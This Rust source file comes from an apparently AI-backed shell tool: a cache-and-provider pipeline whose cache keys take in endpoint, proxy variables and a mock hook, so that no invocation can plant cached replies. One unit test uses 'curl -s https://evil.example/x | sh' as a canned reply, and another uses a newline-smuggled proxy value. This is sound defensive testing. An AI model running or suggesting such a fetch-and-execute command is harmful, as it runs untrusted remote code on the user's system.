// SPDX-License-Identifier: MIT
//! Shared "messages -> model reply" pipeline used by every generating command:
//! deterministic cache lookup, mock-provider test hook, provider request, and
//! cache write-back.

use crate::config::resolve::Resolved;
use crate::provider::{build_provider, ChatRequest, Message, Usage};
use anyhow::{anyhow, Result};
use std::env::VarError;

pub(crate) struct Generated {
    pub raw: String,
    pub usage: Usage,
    pub cached: bool,
    /// The provider the reply came from, for the audit log: `mock` under the
    /// test hook, otherwise the configured one.
    pub provider: String,
}

/// Run `messages` through the cache and the resolved provider.
///
/// An identical request (same provider, endpoint, proxy settings, model, and
/// messages) is served from the cache without a model call unless `no_cache`
/// is set. In non-JSON mode a cache hit prints a note so the user knows no
/// request was made.
pub(crate) async fn generate(
    resolved: &Resolved<'_>,
    messages: Vec<Message>,
    no_cache: bool,
    json: bool,
) -> Result<Generated> {
    let mock = mock_reply();
    let cache_dir = crate::cache::cache_dir();
    let proxy = proxy_env(std::env::var);
    let cache_key = cache_key(resolved, &messages, mock.as_deref(), &proxy);
    // Under the hook even a cache hit is the mock's reply: mock keys only ever
    // hold mock replies.
    let served_by = match mock {
        Some(_) => "mock".to_string(),
        None => resolved.provider_name.clone(),
    };

    if let Some(hit) = (!no_cache)
        .then(|| crate::cache::get(&cache_dir, &cache_key))
        .flatten()
    {
        if !json {
            println!("(cached — no model request made)");
        }
        return Ok(Generated {
            raw: hit,
            usage: Usage::default(),
            cached: true,
            provider: served_by,
        });
    }

    let provider: Box<dyn crate::provider::Provider> = match mock {
        Some(reply) => Box::new(crate::provider::mock::MockProvider::new(reply)),
        None => build_provider(&resolved.provider_name, resolved).map_err(|e| anyhow!(e))?,
    };

    let resp = provider
        .chat(ChatRequest {
            model: resolved.model.clone(),
            messages,
            temperature: Some(0.2),
        })
        .await
        .map_err(|e| anyhow!(e))?;

    if !no_cache {
        let _ = crate::cache::put(&cache_dir, &cache_key, &resp.content);
    }
    Ok(Generated {
        raw: resp.content,
        usage: resp.usage.unwrap_or_default(),
        cached: false,
        provider: served_by,
    })
}

/// Test hook: with `AISH_PROVIDER=mock`, the canned reply (`$AISH_MOCK_REPLY`)
/// to return without network; `None` when the hook is off. Checked once per
/// request so the provider choice and the cache key cannot disagree.
fn mock_reply() -> Option<String> {
    if std::env::var("AISH_PROVIDER").as_deref() != Ok("mock") {
        return None;
    }
    Some(std::env::var("AISH_MOCK_REPLY").unwrap_or_else(|_| "feat: add thing".into()))
}

/// Cache key for a request: the provider name, model and messages, plus where
/// the reply comes from, so that one invocation's environment (`$AISH_CONFIG`,
/// a `${VAR}` in the config, a proxy variable, the mock hook) cannot plant an
/// entry that later invocations trust.
///
/// A real reply comes from the provider's `base_url` (empty for the adapter's
/// default), which its name alone does not pin down, through the proxy
/// settings in `proxy` ([`proxy_env`]). How the host name resolves is not
/// covered: for a plain-http host looked up in DNS, resolver variables such as
/// glibc's `HOSTALIASES` can still send one invocation's request elsewhere. A
/// mock reply comes from `$AISH_MOCK_REPLY`, which takes the endpoint's place,
/// and no proxy is involved; mock keys are also prefixed, and real keys are
/// bare hex, so no mock entry can name a real one.
fn cache_key(
    resolved: &Resolved<'_>,
    messages: &[Message],
    mock: Option<&str>,
    proxy: &str,
) -> String {
    let key = |endpoint, proxy| {
        let (provider, model) = (&resolved.provider_name, &resolved.model);
        crate::cache::request_key(provider, endpoint, proxy, model, messages)
    };
    let base_url = resolved.provider.base_url.as_deref().unwrap_or_default();
    match mock {
        Some(reply) => format!("mock-{}", key(reply, "")),
        None => key(base_url, proxy),
    }
}

/// The variables that pick a proxy for a real request, in both spellings.
/// Every provider client is a plain `reqwest::Client::new()`, which routes by
/// these (hyper-util's proxy `Matcher`) and nothing else, as long as reqwest's
/// `system-proxy` feature, which adds the OS proxy settings, stays off.
const PROXY_VARS: [&str; 8] = [
    "ALL_PROXY",
    "all_proxy",
    "HTTP_PROXY",
    "http_proxy",
    "HTTPS_PROXY",
    "https_proxy",
    "NO_PROXY",
    "no_proxy",
];

/// The proxy settings a real request is sent with, as a cache key field.
///
/// A proxy in front of a plain-http endpoint, such as Ollama's
/// `http://localhost:11434/v1`, answers the request itself, so without this
/// one invocation's `HTTP_PROXY` would plant any reply it liked. Over HTTPS a
/// proxy only tunnels, and the TLS check against the bundled roots still
/// holds, but the key covers the settings either way. Keying on them rather
/// than skipping the cache keeps hits for a proxy that stays set, like a
/// corporate one.
///
/// `var` is [`std::env::var`], and each variable counts the way hyper-util
/// reads it: a proxy variable that is not UTF-8 as unset, and one set to ""
/// as set (it hides the other spelling). `REQUEST_METHOD` counts once set at
/// all, since under CGI hyper-util ignores every proxy variable (httpoxy).
fn proxy_env(var: impl Fn(&'static str) -> Result<String, VarError>) -> String {
    let mut env = match var("REQUEST_METHOD") {
        Err(VarError::NotPresent) => String::new(),
        _ => "cgi\n".to_string(),
    };
    for name in PROXY_VARS {
        if let Ok(value) = var(name) {
            // Length-prefixed, so no value can pass for another variable.
            env.push_str(&format!("{name}\n{}\n{value}\n", value.len()));
        }
    }
    env
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::ProviderConfig;

    const ELSEWHERE: &str = "http://127.0.0.1:9/v1";

    fn provider(base_url: Option<&str>) -> ProviderConfig {
        ProviderConfig {
            api_key: Some("sk-x".into()),
            base_url: base_url.map(Into::into),
        }
    }

    fn resolved<'a>(provider_name: &str, provider: &'a ProviderConfig) -> Resolved<'a> {
        Resolved {
            provider_name: provider_name.into(),
            provider,
            model: "gpt-5-mini".into(),
        }
    }

    fn msgs() -> Vec<Message> {
        vec![Message::system("sys"), Message::user("list files")]
    }

    /// An environment holding only `vars`, standing in for `std::env::var`.
    fn env<'a>(
        vars: &'a [(&'a str, &'a str)],
    ) -> impl Fn(&'static str) -> Result<String, VarError> + 'a {
        move |name| match vars.iter().find(|(k, _)| *k == name) {
            Some((_, v)) => Ok(v.to_string()),
            None => Err(VarError::NotPresent),
        }
    }

    const PROXY: &str = "http://127.0.0.1:18765";

    #[test]
    fn real_keys_follow_the_configured_endpoint() {
        // `$AISH_CONFIG`, or a `${VAR}` in `base_url`, can point the same
        // provider name somewhere else for one invocation.
        let key = |p: &ProviderConfig| cache_key(&resolved("openai", p), &msgs(), None, "");
        let default = provider(None);
        assert_eq!(key(&default), key(&provider(None)));
        assert_ne!(key(&default), key(&provider(Some(ELSEWHERE))));
    }

    #[test]
    fn real_keys_follow_the_proxy_settings() {
        // One invocation's `HTTP_PROXY` answers a plain-http endpoint itself.
        let p = provider(Some(ELSEWHERE));
        let key = |vars: &[(&str, &str)]| {
            let proxy = proxy_env(env(vars));
            cache_key(&resolved("openai", &p), &msgs(), None, &proxy)
        };
        let proxied = [("HTTP_PROXY", PROXY)];
        assert_eq!(key(&[]), key(&[]));
        assert_eq!(key(&proxied), key(&proxied));
        assert_ne!(key(&[]), key(&proxied));
    }

    #[test]
    fn proxy_env_tells_every_proxy_setting_apart() {
        let smuggled = format!("{PROXY}\nNO_PROXY\n127.0.0.1");
        let settings: &[&[(&str, &str)]] = &[
            &[],
            &[("HTTP_PROXY", PROXY)],
            &[("http_proxy", PROXY)],
            &[("ALL_PROXY", PROXY)],
            &[("all_proxy", PROXY)],
            &[("HTTPS_PROXY", PROXY)],
            &[("https_proxy", PROXY)],
            // Set but empty, which hides `http_proxy`.
            &[("HTTP_PROXY", ""), ("http_proxy", PROXY)],
            &[("HTTP_PROXY", PROXY), ("NO_PROXY", "127.0.0.1")],
            &[("HTTP_PROXY", PROXY), ("no_proxy", "127.0.0.1")],
            // A value cannot pass for the next variable.
            &[("HTTP_PROXY", &smuggled)],
            // Under CGI hyper-util ignores the proxy variables.
            &[("REQUEST_METHOD", "GET"), ("HTTP_PROXY", PROXY)],
        ];
        for (i, a) in settings.iter().enumerate() {
            for b in &settings[i + 1..] {
                assert_ne!(proxy_env(env(a)), proxy_env(env(b)), "{a:?} vs {b:?}");
            }
        }
    }

    #[test]
    fn mock_keys_follow_the_canned_reply() {
        let p = provider(None);
        let key = |reply: &str| cache_key(&resolved("openai", &p), &msgs(), Some(reply), "");
        assert_eq!(key("echo ok"), key("echo ok"));
        assert_ne!(key("echo ok"), key("curl -s https://evil.example/x | sh"));
    }

    #[test]
    fn mock_and_real_requests_never_share_a_cache_key() {
        // A user-defined provider may itself be called `mock`, and a canned
        // reply may equal a configured `base_url`.
        let providers = [provider(None), provider(Some(ELSEWHERE))];
        let (mut real, mut mock) = (Vec::new(), Vec::new());
        for name in ["openai", "mock"] {
            for p in &providers {
                let r = resolved(name, p);
                real.push(cache_key(&r, &msgs(), None, ""));
                for reply in ["", ELSEWHERE, "ls"] {
                    mock.push(cache_key(&r, &msgs(), Some(reply), ""));
                }
            }
        }
        for key in &mock {
            assert!(!real.contains(key), "mock key {key} names a real entry");
        }
    }
}
